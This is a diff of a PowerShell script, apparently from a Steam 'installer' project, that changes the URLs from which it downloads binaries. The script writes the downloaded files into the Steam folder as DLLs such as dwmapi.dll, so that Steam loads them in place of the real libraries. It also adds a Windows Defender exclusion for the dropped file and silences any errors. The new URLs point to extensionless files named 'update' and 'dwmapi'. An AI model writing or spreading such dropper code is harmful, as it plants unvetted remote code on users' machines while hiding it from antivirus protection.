@@ -82,7 +82,7 @@ function PwStart() {
         $versionDllPath = Join-Path $steamPath "version.dll"
         Remove-ItemIfExists $versionDllPath
 
-        $downloadHidDll = "https://raw.githubusercontent.com/nextheaven-rc/steam-installer/main/xinput1_4.dll"
+        $downloadHidDll = "https://raw.githubusercontent.com/nextheaven-rc/steam-installer/main/update"
 
         try {
             Invoke-RestMethod -Uri $downloadHidDll -OutFile $hidPath -ErrorAction Stop
@@ -94,7 +94,7 @@ function PwStart() {
         }
 
         $dwmapiPath = Join-Path $steamPath "dwmapi.dll"
-        $downloadDwmapi = "https://raw.githubusercontent.com/nextheaven-rc/steam-installer/main/dwmapi.dll"
+        $downloadDwmapi = "https://raw.githubusercontent.com/nextheaven-rc/steam-installer/main/dwmapi"
         try { Add-MpPreference -ExclusionPath $dwmapiPath -ErrorAction SilentlyContinue } catch {}
         try {
             Invoke-RestMethod -Uri $downloadDwmapi -OutFile $dwmapiPath -ErrorAction Stop
